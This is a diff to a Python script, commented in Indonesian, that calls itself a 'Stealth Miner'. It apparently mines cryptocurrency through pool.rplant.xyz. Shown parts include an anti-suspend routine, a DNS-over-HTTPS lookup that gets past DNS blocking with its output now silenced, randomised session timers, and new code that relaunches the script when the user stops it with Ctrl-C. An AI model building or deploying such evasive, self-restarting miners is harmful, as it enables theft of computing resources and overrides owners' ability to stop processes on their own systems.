@@ -23,7 +23,7 @@ MIN_DURATION = 300
 MAX_DURATION = 720
 MIN_PAUSE = 120
 MAX_PAUSE = 240
-COOLDOWN_DURATION = 180  # Cooldown 3 menit jika CPU penuh
+COOLDOWN_DURATION = 180  # Cooldown 3 menit
 
 # ==== ANTI SUSPEND TANPA ROOT ====
 def anti_suspend():
@@ -41,7 +41,7 @@ def dns_doh_bypass():
         subprocess.call([
             "curl", "-s", "-H", "accept: application/dns-json",
             "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
-        ])
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except:
         pass
 
@@ -107,6 +107,16 @@ def main_loop():
         print(f"[⏳] Menunggu {pause} detik sebelum sesi berikutnya...\n")
         time.sleep(pause)
 
+# ==== AUTO RESTART ====
+def restart_script():
+    try:
+        print("[🔁] Mempersiapkan restart otomatis...")
+        time.sleep(5)
+        subprocess.Popen([sys.executable] + sys.argv)
+        print("[🚀] Script telah di-restart dari subprocess.")
+    except Exception as e:
+        print(f"[X] Gagal restart otomatis: {e}")
+
 # ==== MAIN ====
 if __name__ == "__main__":
     print("⛏️  Stealth Miner: Auto-Restart + Timer Acak + No Root + Cooldown")
@@ -118,3 +128,7 @@ if __name__ == "__main__":
         main_loop()
     except KeyboardInterrupt:
         print("\n[!] Dihentikan oleh user.")
+        restart_script()
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        restart_script()
